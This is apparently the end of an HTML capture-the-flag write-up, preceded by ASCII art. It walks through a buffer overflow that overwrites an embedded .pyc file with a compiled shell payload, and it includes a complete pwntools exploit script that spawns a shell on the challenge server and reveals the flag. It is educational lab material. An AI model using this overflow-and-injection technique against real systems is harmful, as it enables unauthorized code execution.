+⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠸⣷⣮⣿⣿⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⡠⠒⠉⠀⠀⠀⠀⠀⠀⠈⠁⠲⢖⠒⡀⠀⠀
+⠀⠀⠀⡠⠴⣏⠀⢀⡀⠀⢀⡀⠀⠀⠀⡀⠀⠀⡀⠱⡈⢄⠀
+⠀⠀⢠⠁⠀⢸⠐⠁⠀⠄⠀⢸⠀⠀⢎⠀⠂⠀⠈⡄⢡⠀⢣
+⠀⢀⠂⠀⠀⢸⠈⠢⠤⠤⠐⢁⠄⠒⠢⢁⣂⡐⠊⠀⡄⠀⠸
+⠀⡘⠀⠀⠀⢸⠀⢠⠐⠒⠈⠀⠀⠀⠀⠀⠀⠈⢆⠜⠀⠀⢸
+⠀⡇⠀⠀⠀⠀⡗⢺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡄⢀⠎
+⠀⢃⠀⠀⠀⢀⠃⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠷⡃⠀
+⠀⠈⠢⣤⠀⠈⠀⠀⠑⠠⠤⣀⣀⣀⣀⣀⡀⠤⠒⠁⠀⢡⠀
+⡀⣀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀
+⠑⢄⠉⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀
+⠀⠀⠑⠢⢱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀
+⠀⠀⠀⠀⢀⠠⠓⠢⠤⣀⣀⡀⠀⠀⣀⣀⡀⠤⠒⠑⢄⠀⠀
+⠀⠀⠀⠰⠥⠤⢄⢀⡠⠄⡈⡀⠀⠀⣇⣀⠠⢄⠀⠒⠤⠣⠀
+⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀
+<span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>EOF<span class="w"> </span><span class="k">while</span><span class="w"> </span>reading<span class="w"> </span><span class="k">in</span><span class="w"> </span>interactive
+</code></pre></div>
+
+<p>Well, it's something atleast. Of course this isn't the solution, so let's go back to that buffer overflow.</p>
+<hr />
+<h3>The exploit</h3>
+<p>As mentioned earlier, this code allows us to overflow the buffer:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">key_len</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">&quot;Provide the key bytes:&quot;</span><span class="p">);</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">key_len</span><span class="p">);</span>
+</code></pre></div>
+
+<p>The key buffer is 32 bytes long, but we control how much <code>read</code> reads through <code>key_len</code>. We know that the program uses a stack canary, so rip overwrite is not the way to go. Instead, checking the offsets in gdb (ghidra is a bit inconsistent), we can see, that while <code>key</code> is located at -0x730, the code buffer i located at -0x710. With padding of 32 bytes, we should be able to overwrite the code!</p>
+<p>Modifying the code with a <code>key_len</code> of 69696969 and a key of <code>b"A" * 36</code>, should overwrite the first 4 bytes of the pyc file with null-bytes. Running the code, and checking with ghex, confirms this.</p>
+<p>We should now be able to insert our own code into the file, which then gets executed. Assuming it ignores the remaining bytecode, a simple payload would look like:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Compiling this with:</p>
+<div class="codehilite"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>compileall<span class="w"> </span>payload.py
+</code></pre></div>
+
+<p>we can extract the payload bytes. Modifying the magic bytes to fit the specification of 6F0D0D0A, the payload is ready to be deployed. Adjusting the code to inject this payload:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># conn = process(&quot;./trusted_partners&quot;)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;trusted-solutions.hkn&quot;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;payload.pyc&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;69696969&quot;</span><span class="p">)</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">key</span> <span class="o">+=</span> <span class="n">payload</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>And we are dropped into a shell. <code>flag.txt</code> then gives us the flag:</p>
+<blockquote>
+<p>DDC{Sometimes_its_not_about_getting_rip_control}</p>
+</blockquote>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
